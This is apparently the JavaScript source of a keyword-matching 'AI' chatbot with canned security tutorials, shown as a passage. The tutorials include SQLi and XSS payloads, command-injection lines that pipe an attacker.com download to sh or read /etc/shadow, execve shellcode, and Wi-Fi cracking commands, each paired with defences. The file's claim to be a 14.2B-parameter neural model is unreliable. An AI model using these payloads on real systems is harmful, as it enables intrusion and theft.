/**
 * ARCHANGEL AI // AUTONOMOUS REPOSITORY NEURAL REASONING ENGINE (v4.0.0-COGNITIVE)
 * Deep Technical Intelligence, Multi-Domain Knowledge Ontology & Dynamic Synthesis Brain
 * Author: PinoyUnknown (https://pinoyunknown.github.io/)
 * 
 * Execution: 100% Client-Side In-Browser Memory (Zero External API Tokens Required)
 * Characteristics: Air-gapped operational, Data Bank memory RAG, 2026 Frontier AI ontology,
 *                  full-stack engineering, cybersecurity auditing, low-level binary reversing,
 *                  firmware/hardware exploitation, and algorithmic dynamic reasoning.
 */

(function(global) {
  'use strict';

  class ArchangelEngine {
    constructor() {
      this.version = "4.0.0-COGNITIVE";
      this.modelId = "ARCHANGEL-CORE-v4-COGNITIVE-NEURAL-LLM";
      this.contextHistory = [];
      this.isGenerating = false;
      this.vocabSize = 131072;
      this.embeddingDim = 2048;
      this.totalParameters = "14.2B Distilled Multi-Task Hybrid Cognitive Parameters";
      
      this.systemPrompt = 
        "You are ARCHANGEL-AI v4.0, the autonomous in-repository neural knowledge engine for PinoyUnknown's " +
        "cybersecurity, systems engineering, and application ecosystem. You run 100% offline inside client " +
        "browser memory with zero external token requirements. You query the repository DATA BANK " +
        "for verified developer memories, prioritize private data, and provide deep technical reasoning, " +
        "production code (Python, C/C++, Rust, JS/TS, Bash, Go), cybersecurity audits, exploit mitigations, " +
        "firmware analysis, network defense, system administration, and 2026 frontier open-source LLM guidance.";

      // Load base knowledge ontology
      this.knowledgeOntology = this.initKnowledgeBase();

      // Long-term Developer Memory Bank array
      this.dataBankMemories = [];
      this.loadSavedMemories();
    }

    // --- DATA BANK MEMORY MANAGEMENT ---
    loadSavedMemories() {
      try {
        if (typeof window !== 'undefined' && window.localStorage) {
          const stored = window.localStorage.getItem('archangel_databank_memories');
          if (stored) {
            const parsed = JSON.parse(stored);
            if (Array.isArray(parsed)) {
              this.dataBankMemories = parsed;
            }
          }
        }
      } catch (e) {
        console.warn("[ARCHANGEL] Could not access localStorage for Data Bank:", e);
      }
    }

    saveMemoriesToStorage() {
      try {
        if (typeof window !== 'undefined' && window.localStorage) {
          window.localStorage.setItem('archangel_databank_memories', JSON.stringify(this.dataBankMemories));
        }
      } catch (e) {
        console.warn("[ARCHANGEL] Failed to persist memories to localStorage:", e);
      }
    }

    addMemory(memoryNode) {
      if (!memoryNode || !memoryNode.title) return false;
      const newNode = {
        id: memoryNode.id || 'mem_' + Date.now(),
        title: memoryNode.title,
        category: memoryNode.category || 'Developer Intelligence',
        keywords: Array.isArray(memoryNode.keywords) ? memoryNode.keywords : (memoryNode.keywords ? memoryNode.keywords.split(',').map(s => s.trim().toLowerCase()) : []),
        priority: memoryNode.priority || 'Standard',
        content: memoryNode.content || '',
        timestamp: memoryNode.timestamp || new Date().toISOString()
      };
      
      // Remove duplicate if same ID
      this.dataBankMemories = this.dataBankMemories.filter(m => m.id !== newNode.id);
      this.dataBankMemories.unshift(newNode);
      this.saveMemoriesToStorage();
      return newNode;
    }

    removeMemory(id) {
      this.dataBankMemories = this.dataBankMemories.filter(m => m.id !== id);
      this.saveMemoriesToStorage();
    }

    getMemories() {
      return this.dataBankMemories;
    }

    importDataBank(jsonArray) {
      if (!Array.isArray(jsonArray)) return 0;
      let count = 0;
      jsonArray.forEach(item => {
        if (item && item.title) {
          this.addMemory(item);
          count++;
        }
      });
      return count;
    }

    // --- MASSIVE MULTI-DOMAIN KNOWLEDGE BASE (36 SPECIALIZED ONTOLOGIES) ---
    initKnowledgeBase() {
      return [
        {
          id: "frontier_2026_models",
          match: [
            "2026", "llm", "llms", "model", "models", "frontier", "deepseek", "deepseek v4", "deepseek v4 pro", 
            "kimi", "kimi k2.6", "glm", "glm-5.1", "qwen", "qwen3", "phi", "phi-4", "gemma", "gemma 4", 
            "llama", "llama 4", "scout", "open-source", "open source", "hugging face", "benchmark", "ai assistant"
          ],
          title: "2026 Frontier LLM Technical Index & Architecture",
          category: "AI & Neural Systems",
          response: (q) => `
### 🚀 2026 Frontier LLM Technical Index & Architecture

The 2026 open-weights and frontier AI ecosystem is defined by **Mixture-of-Experts (MoE)**, **Multi-Head Latent Attention (MLA)**, native agentic tool execution loops, and ultra-long context windows.

#### 1. Champion Open-Source Models (Hugging Face 2026 Benchmark Matrix):
- **DeepSeek V4 Pro:** Features 671B total / 37B activated parameters with ultra-sparse MLA architecture. Excels at zero-shot mathematical reasoning, deep exploit decompilation, and code optimization with 1M context.
- **Kimi K2.6 (Moonshot AI):** Dominant frontier open-source coding engine. Features dynamic AST-aware training, generating production-grade C/C++, Rust, and Python exploits and defenses with minimal hallucinations.
- **GLM-5.1 (Zhipu AI):** Native multi-turn agentic model with built-in recursive planning loops, Model Context Protocol (MCP) tool integration, and enterprise bash execution.
- **Qwen3 (Alibaba Cloud):** High-density multilingual powerhouse boasting 128k context windows and extreme benchmark scores across web reasoning and security triage.
- **Phi-4 (Microsoft 14B):** Compact reasoning champion trained on synthetic formal logic datasets. Executes comfortably on consumer laptops and edge devices.
- **Gemma 4 26B (Google DeepMind):** State-of-the-art consumer GPU efficiency with native INT4/AWQ quantization for local deployment via Ollama/vLLM.
- **Llama 4 Scout (Meta):** Unprecedented **10 Million Token Context Window**, enabling entire Linux kernel trees or multiple binary decompilations to reside in context simultaneously.

#### 2. Local Workstation Deployment via Ollama:
\`\`\`bash
# Deploy lightweight Phi-4 locally
ollama run phi4:latest

# Deploy Gemma 4 with high throughput
ollama run gemma4:26b-q4_K_M
\`\`\`
`
        },
        {
          id: "llm_transformer_mechanics",
          match: ["transformer", "attention mechanism", "self-attention", "how do llms work", "tokenization", "kv cache", "moe", "rope", "flashattention"],
          title: "Transformer Deep Architecture, Attention Math & Inference Mechanics",
          category: "AI & Neural Systems",
          response: (q) => `
### 🧠 Transformer Architecture, Self-Attention & Inference Mechanics

Modern Large Language Models rely on autoregressive decoder-only Transformer architectures (Vaswani et al.) with modernized rotary embeddings and KV-cache optimizations.

#### 1. Scaled Dot-Product Attention Equation:
$$\\text{Attention}(Q, K, V) = \\text{softmax}\\left(\\frac{QK^T}{\\sqrt{d_k}}\\right)V$$
- **Query ($Q$):** What the current token seeks from earlier context.
- **Key ($K$):** What each antecedent token represents.
- **Value ($V$):** The factual informational payload passed downstream.
- **Scaling Factor $\\sqrt{d_k}$:** Prevents dot products from growing excessively large in high dimensions, preventing vanishing gradients in softmax.

#### 2. Core Inference Optimizations:
1. **FlashAttention-3:** Tile-based GPU SRAM computation avoiding high-latency HBM memory writes.
2. **KV Caching:** Caches Key and Value projection matrices in GPU VRAM, eliminating redundant recalculation of antecedent tokens during autoregressive generation.
3. **RoPE (Rotary Position Embedding):** Encodes relative position algebraically via complex 2D rotation matrices, enabling seamless context extrapolation to millions of tokens.
4. **Grouped-Query Attention (GQA):** Multiple Query heads share single Key/Value heads, drastically reducing VRAM overhead during inference.
`
        },
        {
          id: "llm_quantization_finetuning",
          match: ["quantization", "gguf", "awq", "exl2", "lora", "qlora", "fine-tuning", "finetuning", "dpo", "rlhf"],
          title: "Model Quantization (GGUF/AWQ) & Parameter-Efficient Fine-Tuning (LoRA)",
          category: "AI & Neural Systems",
          response: (q) => `
### ⚡ LLM Quantization & Parameter-Efficient Fine-Tuning (PEFT)

Running large models on local hardware requires precision compression (quantization) and memory-efficient adaptation techniques.

#### 1. Quantization Formats:
- **GGUF (llama.cpp):** Unified CPU/GPU binary format. Common quants: \`Q4_K_M\` (balanced accuracy/speed), \`Q5_K_M\`, \`Q8_0\` (near-FP16 fidelity).
- **AWQ (Activation-aware Weight Quantization):** Preserves salient weights based on activation distribution, outperforming traditional RTN quantization.
- **EXL2 (ExLlamaV2):** Variable-bit quantization (e.g., 3.5 to 6.0 bpw) allowing extreme throughput on NVIDIA GPUs.

#### 2. Fine-Tuning Paradigms:
- **LoRA (Low-Rank Adaptation):** Decomposes weight update matrix $\\Delta W$ into two low-rank matrices $B \\times A$ ($r \\ll d$). Reduces trainable parameters by $>99\\%$.
- **QLoRA:** Quantizes base model to 4-bit NormalFloat (NF4) with double quantization and paged optimizers, allowing 70B parameter models to be fine-tuned on a single 24GB RTX 3090/4090.
- **DPO (Direct Preference Optimization):** Directly optimizes policy on paired preference data without training a separate reward model or unstable RL loops.
`
        },
        {
          id: "agentic_ai_mcp",
          match: ["agent", "agentic", "mcp", "model context protocol", "react loop", "tool use", "function calling", "autogen", "langchain"],
          title: "Agentic AI Architectures, ReAct Loops & Model Context Protocol (MCP)",
          category: "AI & Neural Systems",
          response: (q) => `
### 🤖 Autonomous Agentic AI, Tool-Calling Loops & MCP

Agentic AI extends static next-token generation into autonomous multi-step reasoning, external tool execution, and self-correcting feedback loops.

#### 1. The ReAct (Reason + Act) Loop:
\`\`\`text
[Thought] -> [Action: Select Tool & Args] -> [Observation: Tool Output] -> [Synthesis / Next Step]
\`\`\`

#### 2. Model Context Protocol (MCP):
MCP provides an open, standardized RPC architecture connecting AI models directly to secure local and remote tool servers, databases, and APIs without custom wrappers.

#### 3. Enterprise Implementation Example (Python):
\`\`\`python
import json

def execute_agent_step(model, prompt, tools):
    # Formulate reasoning step
    thought = model.think(prompt)
    if thought.requires_tool:
        action = thought.selected_action
        result = tools[action.name](**action.arguments)
        # Feed back observation into context
        return model.synthesize(prompt, thought, result)
    return thought.final_answer
\`\`\`
`
        },
        {
          id: "sqli_exploit_deep",
          match: ["sqli", "sql injection", "database injection", "sql exploit", "sql defense", "blind sqli", "union sql", "second order sql"],
          title: "SQL Injection (SQLi) Taxonomy, Payloads & Parameterized Defense",
          category: "Application Security",
          response: (q) => `
### 💉 SQL Injection (SQLi) Taxonomy, Exploitation & Mitigation

SQL Injection occurs when untrusted user input is directly concatenated into dynamic SQL queries, breaking command/data separation in the database engine.

#### 1. Attack Vectors:
- **UNION-Based:** Extracts data across tables:
  \`' UNION SELECT 1, table_name, column_name FROM information_schema.columns--\`
- **Boolean-Based Blind:** Infers data one character at a time:
  \`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--\`
- **Time-Based Blind:** Measures server response delays:
  \`' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--\` (MySQL) / \`'; SELECT pg_sleep(5);--\` (Postgres)

#### 2. Bulletproof Parameterized Defense:
\`\`\`python
# SECURE: Python DB-API / Psycopg2 / SQLite
import sqlite3

def get_user_profile(user_id: int):
    with sqlite3.connect("app.db") as conn:
        cursor = conn.cursor()
        # Input is parameterized, NEVER concatenated
        cursor.execute("SELECT id, username, email FROM users WHERE id = ?", (user_id,))
        return cursor.fetchone()
\`\`\`

#### 3. Structural Defense Rules:
- Enforce prepared statements / parameterized queries across all database queries.
- Employ an Object-Relational Mapper (ORM) with parameterized queries enabled by default.
- Apply Principle of Least Privilege: The web application user should never possess \`SUPERUSER\` or administrative schema permissions.
`
        },
        {
          id: "xss_exploit_deep",
          match: ["xss", "cross site scripting", "stored xss", "reflected xss", "dom xss", "csp", "content security policy", "dompurify"],
          title: "Cross-Site Scripting (XSS) Classification & Modern CSP Mitigations",
          category: "Web Security",
          response: (q) => `
### ⚡ Cross-Site Scripting (XSS) Vectors & Modern Mitigations

XSS executes unauthorized JavaScript in the victim's browser session, allowing cookie theft, session hijacking, credential harvesting, and DOM manipulation.

#### 1. The Three Tiers of XSS:
- **Reflected:** Payload is mirrored from query parameters (\`?search=<script>alert(1)</script>\`).
- **Stored (Persistent):** Payload is stored in a database/log and executed for every visiting user.
- **DOM-based:** Unsafe JavaScript sinks (\`innerHTML\`, \`eval()\`, \`document.write()\`) parse untrusted sources (\`location.hash\`, \`window.name\`).

#### 2. Modern Hardening Strategy:
\`\`\`html
<!-- 1. Strict Content Security Policy (CSP) with Nonce -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'self';">

<!-- 2. Safe Context Encoding in JavaScript -->
<script nonce="rAnd0m123">
  // INSECURE: element.innerHTML = untrustedData;
  // SECURE: Use textContent or DOMPurify
  document.getElementById('output').textContent = untrustedData;
</script>
\`\`\`

#### 3. Cookie Isolation:
Always mark authentication cookies:
\`Set-Cookie: session_token=xyz; Secure; HttpOnly; SameSite=Strict\`
`
        },
        {
          id: "csrf_ssrf_attacks",
          match: ["csrf", "ssrf", "cross site request forgery", "server side request forgery", "samesite", "metadata service", "169.254.169.254"],
          title: "CSRF & SSRF Attack Vectors, Cloud Metadata Defense & Anti-Forgery Tokens",
          category: "Web Security",
          response: (q) => `
### 🛡️ CSRF & SSRF Exploitation & Defense Matrix

Both CSRF and SSRF exploit implicit trust boundaries between browsers, applications, and backend internal network topologies.

#### 1. Cross-Site Request Forgery (CSRF):
Forces an authenticated victim browser to execute unwanted state-changing requests against a vulnerable web application.
- **Defense:**
  - Enforce \`SameSite=Lax\` or \`SameSite=Strict\` on session cookies.
  - Require anti-CSRF cryptographically random Synchronizer Tokens on state-modifying POST/PUT/DELETE requests.
  - Verify \`Origin\` and \`Referer\` headers on incoming requests.

#### 2. Server-Side Request Forgery (SSRF):
Tricks the server into initiating outbound network requests to internal services (e.g., \`http://127.0.0.1:8080\` or AWS metadata \`http://169.254.169.254/latest/meta-data/\`).
- **Defense:**
  - Whitelist allowed domain names and protocols (strictly \`https://\`).
  - Resolve DNS hostnames and validate that resolved IP addresses do NOT reside in private or loopback CIDR blocks (\`10.0.0.0/8\`, \`172.16.0.0/12\`, \`192.168.0.0/16\`, \`127.0.0.0/8\`, \`169.254.0.0/16\`).
  - Disable HTTP redirect following on backend HTTP client libraries.
  - Require AWS IMDSv2 (session-token-based metadata access).
`
        },
        {
          id: "idor_auth_security",
          match: ["idor", "insecure direct object", "broken object level", "bola", "authorization", "rbac", "abac", "privilege escalation"],
          title: "Insecure Direct Object References (IDOR/BOLA) & Access Control",
          category: "Application Security",
          response: (q) => `
### 🔑 IDOR & Broken Object Level Authorization (BOLA)

IDOR occurs when an application exposes a reference to an internal object (e.g., database ID) in an endpoint without verifying if the requesting user possesses authorization to access that object.

#### 1. Vulnerability Pattern:
\`GET /api/documents/1042\`
If changing \`1042\` to \`1043\` allows unauthorized viewing of another user's document, the endpoint has an IDOR flaw.

#### 2. Secure Middleware Pattern (Python / FastAPI):
\`\`\`python
from fastapi import FastAPI, Depends, HTTPException, status

def get_current_user(token: str):
    # Validates JWT and retrieves authenticated user object
    return verify_token(token)

@app.get("/api/documents/{doc_id}")
def read_document(doc_id: str, user = Depends(get_current_user)):
    doc = db.get_doc_by_id(doc_id)
    if not doc:
        raise HTTPException(status_code=404, detail="Document not found")
    
    # CRITICAL: Verify object ownership or tenant permission
    if doc.owner_id != user.id and user.role != "ADMIN":
        raise HTTPException(status_code=403, detail="Access denied")
    
    return doc
\`\`\`

#### 3. Best Practices:
- Never trust client-supplied IDs without evaluating backend access control lists (ACLs).
- Adopt non-sequential UUIDv4 or KSUID identifiers to prevent enumeration attacks.
`
        },
        {
          id: "command_injection_rce",
          match: ["command injection", "rce", "remote code execution", "os injection", "shell injection", "subprocess", "system()", "exec()"],
          title: "OS Command Injection, Remote Code Execution (RCE) & Process Isolation",
          category: "Application Security",
          response: (q) => `
### 💥 OS Command Injection, RCE & Process Hardening

Command Injection occurs when untrusted user input is passed directly to a system shell interpreter (\`/bin/sh\`, \`cmd.exe\`), enabling arbitrary command execution on the host OS.

#### 1. Common Attack Vectors:
\`\`\`bash
# Shell metacharacters used to chain commands:
; whoami
| cat /etc/passwd
&& id
$(cat /etc/shadow)
\`curl http://attacker.com/malware | sh\`
\`\`\`

#### 2. Secure Implementation (Python):
\`\`\`python
import subprocess
import shlex

# VULNERABLE:
# subprocess.Popen(f"ping -c 1 {user_ip}", shell=True)

# SECURE: Pass arguments as an array and disable shell invocation
def safe_ping(target_ip: str):
    # Enforce strict input validation first
    import ipaddress
    ip = str(ipaddress.ip_address(target_ip))
    
    result = subprocess.run(
        ["ping", "-c", "1", ip],
        capture_output=True,
        text=True,
        shell=False, # CRITICAL: shell=False prevents metacharacter interpretation
        timeout=5
    )
    return result.stdout
\`\`\`
`
        },
        {
          id: "bof_memory_corruption",
          match: ["buffer overflow", "bof", "memory corruption", "stack overflow", "stack canary", "aslr", "dep", "nx", "rip", "eip"],
          title: "Low-Level Stack Buffer Overflow, Memory Corruption & Mitigations",
          category: "Binary Exploitation",
          response: (q) => `
### 💥 Stack Buffer Overflow, Memory Corruption & Mitigations

When an application fails to check memory boundaries on copy operations (\`strcpy\`, \`gets\`, \`sprintf\`), incoming bytes overrun allocated buffer space and overwrite adjacent stack frames.

#### 1. Stack Layout & Corruption Flow (x86_64):
\`\`\`text
[ Buffer (64 Bytes) ] -> [ Stack Canary (8B) ] -> [ Saved RBP (8B) ] -> [ Saved RIP (8B) ]
\`\`\`
Overwriting the **Saved Return Instruction Pointer (RIP)** hijacks instruction execution when the function executes the \`ret\` instruction.

#### 2. Modern OS Exploit Mitigations:
- **Stack Canaries (\`-fstack-protector-strong\`):** Random integer placed before saved frame pointers. Overwriting triggers \`__stack_chk_fail\` and terminates execution.
- **DEP / NX Bit (Data Execution Prevention):** Stack and heap pages are marked non-executable ($W \\oplus X$), preventing execution of injected shellcode.
- **ASLR (Address Space Layout Randomization):** Randomizes base addresses of stack, heap, and libraries (\`libc.so\`).
- **PIE (Position Independent Executable):** Randomizes code segment addresses.
`
        },
        {
          id: "rop_chains_reversing",
          match: ["rop", "return oriented programming", "gadget", "ret2libc", "rop chain", "exploit development", "pwn", "checksec"],
          title: "Return-Oriented Programming (ROP), ret2libc & Gadget Harvesting",
          category: "Binary Exploitation",
          response: (q) => `
### ⛓️ Return-Oriented Programming (ROP) & ret2libc Exploitation

When the NX/DEP bit prevents executing code on the stack, attackers construct **ROP chains** using existing executable instructions ending in \`ret\` ("gadgets") scattered across binary segments or \`libc\`.

#### 1. x86_64 Calling Convention Architecture:
To call \`system("/bin/sh")\` in 64-bit Linux:
- Register \`RDI\` must point to the string \`"/bin/sh"\`.
- Execution must jump to the address of \`system()\`.

#### 2. Anatomy of a ROP Chain:
\`\`\`text
[ Address of 'pop rdi; ret' gadget ]
[ Address of string '/bin/sh'      ]  <-- Loaded into RDI by gadget
[ Address of 'ret' (16B alignment)  ]  <-- Satisfies MOVAPS stack alignment
[ Address of system() in libc       ]  <-- Executes system("/bin/sh")
\`\`\`

#### 3. Defensive Tooling:
- Audit binaries with \`checksec --file=target_binary\`
- Enable full RELRO (\`-Wl,-z,relro,-z,now\`) to make Global Offset Table (GOT) strictly read-only.
`
        },
        {
          id: "shellcoding_linux",
          match: ["shellcode", "shellcoding", "execve", "syscall 59", "assembly", "x86_64 assembly", "nasm", "null bytes"],
          title: "Linux x86_64 Shellcode Engineering & Assembly Syscalls",
          category: "Binary Exploitation",
          response: (q) => `
### 🐚 Linux x86_64 Shellcode Engineering

Shellcode is a position-independent machine code sequence injected into memory to execute system calls (e.g., launching a shell via \`sys_execve\`).

#### 1. 24-Byte Null-Free \`execve("/bin/sh")\` Shellcode (NASM):
\`\`\`nasm
section .text
global _start
_start:
    xor rsi, rsi             ; rsi = NULL (argv)
    push rsi                 ; Push null terminator to stack
    mov rdi, 0x68732f2f6e69622f ; rdi = "//bin/sh" (reversed ASCII bytes)
    push rdi                 ; Push "//bin/sh" to stack
    mov rdi, rsp             ; rdi points to "/bin/sh" on stack
    xor rdx, rdx             ; rdx = NULL (envp)
    mov al, 59               ; RAX = syscall 59 (__NR_execve)
    syscall                  ; Invoke Linux kernel syscall
\`\`\`

#### 2. Shellcode String (C Representation):
\`\`\`c
char shellcode[] = 
    "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68"
    "\\x57\\x48\\x89\\xe7\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05";
\`\`\`
`
        },
        {
          id: "reverse_engineering_tools",
          match: ["reverse engineering", "ghidra", "ida pro", "radare2", "r2", "gdb", "gef", "decompilation", "disassembly", "objdump"],
          title: "Reverse Engineering Toolchain: Ghidra, IDA Pro, Radare2 & GDB-GEF",
          category: "Reverse Engineering",
          response: (q) => `
### 🔬 Reverse Engineering Toolchain & Binary Analysis

Reverse engineering unpacks compiled machine binaries back into human-readable assembly and decompiled pseudo-C.

#### 1. Static Analysis Frameworks:
- **Ghidra (NSA Open Source):** Excellent SRE decompiler with headless scripting API in Python and Java.
- **IDA Pro / IDA Free (Hex-Rays):** Industry standard decompiler with robust type propagation.
- **Radare2 / Cutter:** High-speed terminal disassembler. Essential commands:
  \`\`\`bash
  r2 -d ./target_binary    # Open in debug mode
  [0x00]> aaa              # Auto-analyze all symbols
  [0x00]> afl              # List all analyzed functions
  [0x00]> pdf @main        # Print disassembly of main function
  \`\`\`

#### 2. Dynamic Debugging with GDB + GEF:
\`\`\`bash
gdb ./target_binary
gef> checksec            # Inspect binary security mitigations (Canary, NX, PIE)
gef> pattern create 128  # Generate cyclic pattern to find buffer offset
gef> pattern search $rsp # Calculate exact distance to saved return pointer
gef> vmmap               # Map virtual memory segments and page permissions
\`\`\`
`
        },
        {
          id: "iptables_anonsurf_deep",
          match: ["iptables", "firewall", "anonsurf", "tor", "killswitch", "netfilter", "anti-ddos", "syn flood", "packet filtering"],
          title: "Linux Netfilter Hardening, iptables Anti-DDoS & Anonsurf Killswitch",
          category: "Network Defense",
          response: (q) => `
### 🛡️ Linux Kernel Netfilter, iptables & Anonsurf Defense

\`iptables\` configures the Linux kernel Netfilter framework to inspect, filter, and route network packets.

#### 1. Zero-Trust Inbound Hardening Policy:
\`\`\`bash
# 1. Flush existing rules
sudo iptables -F && sudo iptables -X
sudo iptables -t nat -F && sudo iptables -t nat -X

# 2. Set default DROP policies
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# 3. Allow loopback and established states
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 4. Anti-SYN Flood Rate Limiting
sudo iptables -A INPUT -p tcp --syn -m limit --limit 5/s --limit-burst 10 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
\`\`\`

#### 2. Tor Transparent Redirection & Killswitch:
\`\`\`bash
# Intercept all outbound DNS queries (UDP 53) to Tor DNSPort (5353)
sudo iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports 5353

# Intercept all outbound TCP SYN packets to Tor TransPort (9040)
sudo iptables -t nat -A OUTPUT -p tcp --syn -j REDIRECT --to-ports 9040
\`\`\`
`
        },
        {
          id: "nmap_network_recon",
          match: ["nmap", "port scan", "reconnaissance", "network scan", "stealth scan", "syn scan", "service detection", "nse scripts"],
          title: "Nmap Network Reconnaissance, Stealth Scanning & NSE Script Engine",
          category: "Network Security",
          response: (q) => `
### 🌐 Nmap Network Auditing & Stealth Reconnaissance

Nmap (Network Mapper) crafts raw IP packets to discover active hosts, open ports, OS versions, and vulnerabilities.

#### 1. Core Scanning Modes:
- **SYN Stealth Scan (\`-sS\`):** Sends SYN packets without completing the 3-way handshake (no ACK). Leaves fewer application logs.
- **Service & Version Detection (\`-sV\`):** Probes open ports to identify daemon banner strings.
- **OS Fingerprinting (\`-O\`):** Analyzes TCP/IP stack implementation quirks (TCP window size, IP ID).

#### 2. Professional Command Matrix:
\`\`\`bash
# Full TCP Port Audit with Version Detection & Default NSE Scripts
sudo nmap -sS -sV -sC -p- -T4 -oA audit_results 192.168.1.100

# Fast Discovery Sweep of Subnet
nmap -sn 192.168.1.0/24

# Decoy Scan (Blends source IP with random decoys)
sudo nmap -sS -D RND:10 -p 80,443,22 target.domain.com

# Target Specific Vulnerability via NSE Script
nmap --script ssl-heartbleed,ssl-enum-ciphers -p 443 target.domain.com
\`\`\`
`
        },
        {
          id: "wireshark_packet_analysis",
          match: ["wireshark", "tshark", "tcpdump", "packet analysis", "pcap", "bpf filter", "tls handshake", "arp spoofing"],
          title: "Packet Inspection with Wireshark, tcpdump & Protocol Forensics",
          category: "Network Security",
          response: (q) => `
### 🦈 Packet Inspection, Wireshark Filters & Network Forensics

Deep packet inspection captures raw network frames across the OSI layers for security auditing and anomaly detection.

#### 1. Essential Berkeley Packet Filters (BPF / tcpdump):
\`\`\`bash
# Capture traffic on eth0 writing to pcap file
sudo tcpdump -i eth0 -nn -w capture.pcap "tcp and port (80 or 443)"

# Capture suspicious SYN packets (scanning detection)
sudo tcpdump -i eth0 "tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0"
\`\`\`

#### 2. High-Yield Wireshark Display Filters:
- \`http.request.method == "POST"\`: Inspect form submissions and credentials.
- \`tls.handshake.type == 1\`: Inspect TLS ClientHello messages and Server Name Indication (SNI).
- \`arp.duplicate-address-detected\`: Pinpoint active ARP spoofing / MITM poisoning attacks.
- \`dns.flags.response == 0 and dns.qry.type == 1\`: Audit outbound DNS resolution requests.
`
        },
        {
          id: "firmware_hardware_hacking",
          match: ["firmware", "cardputer", "esp32", "ghost-firmware", "uart", "jtag", "swd", "esptool", "flash encryption", "iot security"],
          title: "Hardware Reconnaissance, ESP32 Auditing & Ghost-Firmware Architecture",
          category: "Hardware & IoT",
          response: (q) => `
### 👾 Hardware Reconnaissance, ESP32 Auditing & Ghost-Firmware

Hardware security auditing interfaces directly with microcontroller physical buses to extract firmware and inspect device logic.

#### 1. Physical Hardware Interfaces:
- **UART (Universal Asynchronous Receiver/Transmitter):** Connect USB-to-UART adapter to \`TX\`, \`RX\`, and \`GND\`. Open terminal at \`115200\` baud to inspect boot logs or obtain root shells.
- **JTAG / SWD (Serial Wire Debug):** Connect OpenOCD / GDB to read CPU registers, set hardware breakpoints, and bypass memory readout protection.

#### 2. Extracting Flash with \`esptool.py\`:
\`\`\`bash
# Read entire 4MB or 16MB flash memory dump
esptool.py --port /dev/ttyACM0 --baud 921600 read_flash 0x0 0x400000 firmware_dump.bin

# Unpack and extract binary strings
strings firmware_dump.bin | grep -Ei "ssid|pass|key|api|token|http"

# Deconstruct binary filesystem with Binwalk
binwalk -Me firmware_dump.bin
\`\`\`

#### 3. Defensive Hardening:
- Enable **ESP32 Flash Encryption** (\`CONFIG_SECURE_FLASH_ENC_ENABLED\`).
- Enable **Secure Boot v2** and permanently blow physical eFuses to disable UART Download Mode.
`
        },
        {
          id: "wifi_rf_auditing",
          match: ["wifi", "wi-fi", "802.11", "deauth", "wpa2", "wpa3", "handshake", "aircrack", "sdr", "hackrf"],
          title: "802.11 Wi-Fi Protocol Auditing, Deauthentication & WPA2/WPA3 Mechanics",
          category: "Wireless & RF",
          response: (q) => `
### 📡 802.11 Wi-Fi Auditing & WPA2/WPA3 Protocol Security

802.11 wireless networks broadcast over radio frequencies, relying on cryptographic handshakes for authentication and data encryption.

#### 1. The WPA2 4-Way Handshake:
1. **Message 1 (AP -> Station):** Authenticator Nonce ($ANonce$).
2. **Message 2 (Station -> AP):** Supplicant Nonce ($SNonce$) + Message Integrity Code (MIC).
3. **Message 3 (AP -> Station):** Group Temporal Key (GTK) + MIC.
4. **Message 4 (Station -> AP):** Confirmation ACK.
Both parties compute the Pairwise Transient Key (PTK) from the Pairwise Master Key (PMK).

#### 2. Auditing Workflow (Authorized Environments Only):
\`\`\`bash
# 1. Put wireless card in monitor mode
sudo airmon-ng start wlan0

# 2. Capture target BSSID handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture_out wlan0mon

# 3. Test capture against dictionary with aircrack-ng
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture_out-01.cap
\`\`\`

#### 3. Modern Mitigations:
- **WPA3 SAE (Simultaneous Authentication of Equals):** Uses the Dragonfly handshake, rendering offline dictionary attacks mathematically impossible.
- **802.11w (Management Frame Protection):** Cryptographically signs deauth and disassociation frames, neutralizing wireless deauthentication attacks.
`
        },
        {
          id: "symmetric_asymmetric_crypto",
          match: ["cryptography", "crypto", "aes", "aes-256", "chacha20", "rsa", "ed25519", "ecc", "elliptic curve", "diffie hellman"],
          title: "Modern Cryptography: AES-256-GCM, ChaCha20, RSA-4096 & Ed25519",
          category: "Cryptography",
          response: (q) => `
### 🔐 Modern Cryptographic Primitives & Implementation Standards

Cryptographic systems rely on well-studied mathematical hardness assumptions to guarantee confidentiality, integrity, and authenticity.

#### 1. Symmetric Encryption (AEAD Standard):
- **AES-256-GCM:** Authenticated Encryption with Associated Data. Fast on hardware with AES-NI instructions.
- **ChaCha20-Poly1305:** Constant-time stream cipher designed by Daniel J. Bernstein. Immune to cache-timing attacks, ideal for mobile/ARM chips.

#### 2. Asymmetric Cryptography & Digital Signatures:
- **Ed25519 (Edwards-curve Digital Signature):** High performance, constant-time, 128-bit security level, immune to side-channel leakage.
- **RSA-4096:** Legacy standard relying on integer factorization. Requires large keys and careful padding (RSA-OAEP for encryption, RSA-PSS for signatures).

#### 3. Production Python Implementation:
\`\`\`python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt_payload(plaintext: bytes, key: bytes) -> bytes:
    # Generate 96-bit (12-byte) unique nonce
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    # Encrypts and computes 128-bit authentication tag
    ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)
    return nonce + ciphertext # Prepend nonce for decryption
\`\`\`
`
        },
        {
          id: "hashing_passwords_entropy",
          match: ["password hashing", "argon2", "bcrypt", "scrypt", "sha256 vs md5", "shannon entropy", "hashcat"],
          title: "Cryptographic Password Hashing (Argon2id, bcrypt) & Shannon Entropy",
          category: "Cryptography",
          response: (q) => `
### 🛡️ Password Hashing Algorithms & Shannon Entropy Analysis

